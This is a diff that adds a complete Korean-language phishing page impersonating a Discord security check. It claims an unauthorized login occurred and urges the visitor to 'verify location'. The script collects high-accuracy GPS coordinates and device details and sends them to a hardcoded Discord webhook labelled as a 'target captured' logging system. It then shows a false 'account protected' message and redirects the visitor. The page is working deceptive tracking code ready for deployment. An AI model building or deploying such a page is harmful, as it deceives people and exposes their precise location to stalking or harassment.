@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord 보안 확인 센터</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #36393f; color: #ffffff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #2f3136; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); max-width: 400px; }
+        .logo { color: #5865f2; font-size: 48px; margin-bottom: 20px; font-weight: bold; }
+        h1 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #b9bbbe; font-size: 14px; line-height: 1.5; }
+        .btn { background-color: #5865f2; color: white; border: none; padding: 12px 24px; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 20px; transition: background 0.2s; }
+        .btn:hover { background-color: #4752c4; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Discord</div>
+        <h1>비정상적 로그인 감지</h1>
+        <p>최근 귀하의 계정에 대한 무단 접근 시도가 확인되었습니다. 본인 확인을 위해 아래 버튼을 눌러 <b>위치 인증</b>을 완료하십시오.</p>
+        <button class="btn" onclick="grab()">계정 보안 인증하기</button>
+    </div>
+
+    <script>
+        // ⚠️ 사용자님의 디스코드 웹훅 주소를 여기에 넣으세요.
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504180730065060091/04MSAWnJml7CocT_QTGidlB8cXxOEuQ1tWByB5W8RxppYB2f9EpVGnG7BKnehCYE1C-b";
+
+        async function grab() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const data = {
+                        embeds: [{
+                            title: "🎯 타겟 검거 완료 (정밀 위치)",
+                            color: 15105570,
+                            fields: [
+                                { name: "📍 구글맵 좌표", value: `[${pos.coords.latitude}, ${pos.coords.longitude}](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
+                                { name: "📏 정확도", value: `\`${Math.round(pos.coords.accuracy)}m\``, inline: true },
+                                { name: "📱 기기 정보", value: "```" + navigator.userAgent + "```" }
+                            ],
+                            footer: { text: "X2-Hunter Logging System" },
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    // 디스코드로 데이터 전송
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+
+                    alert("인증되었습니다. 계정이 보호되었습니다.");
+                    window.location.href = "https://discord.com/safety";
+                }, (err) => {
+                    alert("보안 오류: 위치 권한을 허용해야 인증이 완료됩니다.");
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            }
+        }
+    </script>
+</body>
+</html>
